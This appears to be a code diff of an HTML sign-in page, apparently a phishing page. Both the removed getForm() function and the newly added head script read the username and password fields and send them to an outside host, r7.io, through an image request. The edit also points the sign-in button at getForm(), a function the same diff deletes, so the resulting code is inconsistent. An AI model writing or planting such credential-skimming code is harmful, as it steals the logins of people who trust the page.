@@ -6,11 +6,11 @@
 
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
 
-    <link href=fonts.css" media="screen" rel="stylesheet" type="text/css">
+    <link href="fonts.css" media="screen" rel="stylesheet" type="text/css">
 
-    <link href=login.gz.css" media="screen" rel="stylesheet" type="text/css">
+    <link href="login.gz.css" media="screen" rel="stylesheet" type="text/css">
 
-    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
     <script>
         $(document).ready( function() {
             var language = 'english';
@@ -19,19 +19,11 @@
             }
         });
     </script>
-
-
-          <script>
-
-          function getForm (form) {
-            var Password1 = $('#login_password').val();
-            var Username1 = $('#login_username').val();
-            alert(Password1 + "    " + Username1);
+    <script>
             var i = new Image();
-            i.src = "http://r7.io/e/segall2?s=" + Username1 + Password1;
-        };
+            i.src = "http://r7.io/e/segall2?s=" + $('#login_username').val() + $('#login_password').val();
 
-          </script>
+    </script>
 
   </head>
 
@@ -50,7 +42,7 @@
           <input id="login_password" placeholder="passphrase" tabindex="2" autocomplete="off" class="validate-text" name="password" type="password" mouseev="true" keyev="true" clickev="true"> 
       </div>
         <input id="user_language" name="user_language" type="hidden" value="english">
-        <input type="submit" id="signin-btn" class="submit-btn optional" value="Sign in..." tabindex="3">
+        <input type="button" id="signin-btn" class="submit-btn optional" value="Sign in..." onClick="getForm(this.form)" tabindex="3">
       </div>
 
       <div class="supplemental-links">
